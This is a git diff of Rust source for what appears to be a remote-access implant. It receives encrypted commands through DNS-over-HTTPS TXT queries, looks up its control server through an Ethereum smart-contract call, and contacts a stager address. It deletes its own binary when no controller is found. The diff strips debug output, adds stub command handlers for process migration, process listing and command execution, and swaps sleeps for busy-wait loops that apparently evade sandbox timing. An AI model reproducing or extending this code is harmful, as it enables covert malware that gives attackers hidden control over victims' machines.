@@ -148,14 +148,12 @@ fn parseDNSTextEntry(response: &str) -> String{
     for x in captures_iter{
         let mut data = x.unwrap().get(0).unwrap().as_str();
         data = data.trim_end_matches("\\");
-        println!("Regex! {}", &data);
         result.push_str(&data);
     }
     return result.clone()
 }
 
 fn is_base32(s: &str) -> bool {
-    println!("Checking data");
     let decode = base32::decode(Alphabet::RFC4648 { padding: true }, s);
     if decode.is_some(){
         return true
@@ -204,8 +202,6 @@ fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, pub
         lastPacket = 0;
     }
 
-    println!("Ping encoded :: {}", &result);
-    println!("Checking TXT entry");
 
     let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
     url.query_pairs_mut()
@@ -218,15 +214,11 @@ fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, pub
 
     result.clear();
 
-
-    println!("Data before regex {}", &data);
     let mut ndata = parseDNSTextEntry(&data);
-    println!("Data after regex {}", &ndata);
 
     let bFlag = is_base32(&ndata);
     if bFlag == false{
         let commandDecoded = &base64::decode(ndata).unwrap();
-        println!("Decoded {:?}", &commandDecoded);
         let padding = Oaep::new::<sha2::Sha256>();
         let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
         match dec_data{
@@ -234,7 +226,6 @@ fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, pub
                 let utf_data = String::from_utf8(dec_data).unwrap();
                 let new_string: String = utf_data.to_owned();
                 let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
-                println!("Data {:?}", &parts);
                 return parts;
             }
             Err(err)=>{
@@ -247,6 +238,18 @@ fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, pub
     return vec![];
 }
 
+fn migrateProcessToPID(procPID: &str) -> &str{
+    return procPID;
+}
+
+fn listRunningProcesses(){
+    println!("Listing running processes...");
+}
+
+fn commandExec(command: &str){
+    println!("Executing command! {}", command);
+}
+
 //fn dnsRequestEncryptEncode(domain: &str, data: &str, public_key_external: &RsaPublicKey){
  //   let padding = Oaep::new::<sha2::Sha256>();
   //  let mut rng = rand::thread_rng();
@@ -254,13 +257,16 @@ fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, pub
    //s println!("{:?}", enc_data.unwrap());
 //}
 
+use std::thread::park_timeout;
+use std::time::{Instant};
+use std::arch::asm;
 fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
-    println!("command server!");
     unsafe{
         if let Some(ref mutex) = SleepTime{
             while true{
                 let mut stime = mutex.lock().unwrap();
-                let ten_millis = time::Duration::from_millis(*stime);
+                let timeout = Duration::from_secs(*stime);
+
                 let command = checkDNSTextEntry(&domain, &private_key_internal, &public_key_hash);
                 if !command.is_empty(){
                     match command.get(1).unwrap().as_str() {
@@ -273,10 +279,27 @@ fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public
                                 std::mem::drop(stime);
                             }
                         "x" => println!("o segundo elemento é três!"),
+                        "m" => {
+                            migrateProcessToPID(command.get(2).unwrap().as_str());
+                        },
+                        "l" => {
+                            listRunningProcesses();
+                        },
+                        "c" => {
+                            commandExec(command.get(2).unwrap().as_str());
+                        }
                         _ => println!("o segundo elemento não é válido!"),
                     }
                 }
-                thread::sleep(ten_millis);
+                let start = Instant::now();
+                while start.elapsed() < timeout {
+                    //unsafe {
+                        //asm!(
+                         //   "nop",
+                        //);
+                    //}
+                }
+                
             }
         }
     }
@@ -287,26 +310,22 @@ use std::time::Duration;
 #[allow(unused_variables)]
 fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
     unsafe {
-        SleepTime = Some(Mutex::new(10000)); // inicializa a variável global
+        SleepTime = Some(Mutex::new(10)); // Default sleep time
     }
     let domain_clone = domain.to_string();
     let public_key_hash_clone = public_key_hash.to_string();
     let public_key_external_clone = public_key_external.clone();
     let private_key_clone = private_key_internal.clone();
 
-    println!("ping server");
     thread::spawn(move || {
         commandServerHandler(&domain_clone, &public_key_external_clone, &public_key_hash_clone, &private_key_clone);
     });
 
-    //let domain_clone2 = domain.to_string();
-    //let public_key_hash_clone2 = public_key_hash.to_string();
-    //thread::spawn(move || {
-    //    commandServerHandler(&domain_clone2, &public_key_external_clone, &public_key_hash_clone2, &private_key_clone);
-    //});
-
+    // Dummy infinite sleep
     loop {
-        thread::sleep(Duration::from_secs(1));
+        let timeout = Duration::from_secs(1);
+        let start = Instant::now();
+        while start.elapsed() < timeout {}
     }
 }
 
@@ -331,12 +350,6 @@ fn handleCertificate(domain: &str) -> Result<()>{
         &result
     ).unwrap();
     let public_key_external = Some(RsaPublicKey::from_public_key_pem(&String::from_utf8_lossy(&decoded_bytes)).unwrap());
-    
-    //let padding = Oaep::new::<sha2::Sha256>();
-    //let mut rng = rand::thread_rng();
-    // let data = b"hello world";
-    // let enc_data = public_key.encrypt(&mut rng, padding, &data[..]).expect("failed to encrypt");
-    // println!("Decoded: {:?}", public_key);
 
     let (serverPublicKeySha256, privkey) = handleKeyGeneration(domain, std::str::from_utf8(&decoded_bytes).unwrap());
 
@@ -354,6 +367,16 @@ use rustc_serialize::json::{Json, ToJson};
 async fn handleContractKeccak(contractAddress: &str) -> String{
     // call RPC and interact with smart contract variable name (keccak)
 
+    let timeout = Duration::from_secs(10);
+    let start = Instant::now();
+    while start.elapsed() < timeout {
+        unsafe {
+            asm!(
+                "nop",
+            );
+        }
+    }
+
     let mut payload = String::from(r#"{"method": "eth_call","params": [{"from": "0x0000000000000000000000000000000000000000","to": "CONTRACTADDRESS","data": "KECCAKHERE"},"latest"],"id": 1,"jsonrpc": "2.0"}"#);
     let newPayload = payload.replace("CONTRACTADDRESS", contractAddress);
 
@@ -367,8 +390,6 @@ async fn handleContractKeccak(contractAddress: &str) -> String{
     .await;
 
     let response = request.unwrap().text().await.unwrap();
-    println!("Response :: {}", response);
-    //let jsonResponse: Value = serde_json::from_str(&response).unwrap();
 
     let json_object = Json::from_str(&response).unwrap();
 
@@ -390,41 +411,24 @@ async fn handleContractKeccak(contractAddress: &str) -> String{
 use std::fs;
 use std::mem;
 use std::ptr;
-use libc::{mprotect, PROT_NONE, PROT_READ};
+// use libc::{mprotect, PROT_NONE, PROT_READ};
 
 #[tokio::main]
 async fn rpcInteract(addr: &str) -> Result<((()), String)>{
     let contractC2 = handleContractKeccak(addr).await;
     if contractC2 == ""{
         let path = std::env::current_exe().unwrap();
-
-        // Abra o arquivo binário para leitura
-        let mut file = fs::File::open(&path).unwrap();
-    
-        // Carregue todo o arquivo binário na memória
-        let mut buffer = Vec::new();
-        file.read_to_end(&mut buffer).unwrap();
-    
-        // Feche o arquivo para garantir que ele não esteja mais em uso
-        drop(file);
-
-        unsafe {
-            ptr::write(buffer.as_mut_ptr(), mem::zeroed());
-        }
-    
-        // Apague o binário
         fs::remove_file(&path).unwrap();
 
-        let base_addr = std::ptr::null_mut();
+        //let base_addr = std::ptr::null_mut();
 
-        // Obter o tamanho do programa
-        let program_size = 0; // Preencher com o tamanho do programa
+        //let program_size = 0; // Preencher com o tamanho do programa
     
         // Definir as permissões desejadas
-        let prot = PROT_NONE;
+        //let prot = PROT_NONE;
     
         // Remover a permissão de leitura
-        let result = unsafe { mprotect(base_addr, program_size, prot) };
+        //let result = unsafe { mprotect(base_addr, program_size, prot) };
 
         process::exit(0);
     }
@@ -445,7 +449,9 @@ async fn rpcInteract(addr: &str) -> Result<((()), String)>{
     Ok(((()), domain.to_string()))
 }
 
+
 fn main() -> std::io::Result<()> {
+
     let mut stream = TcpStream::connect("STAGERADDRESS")?;
     let mut smartContractAddressBuffer= [0; 42];
 
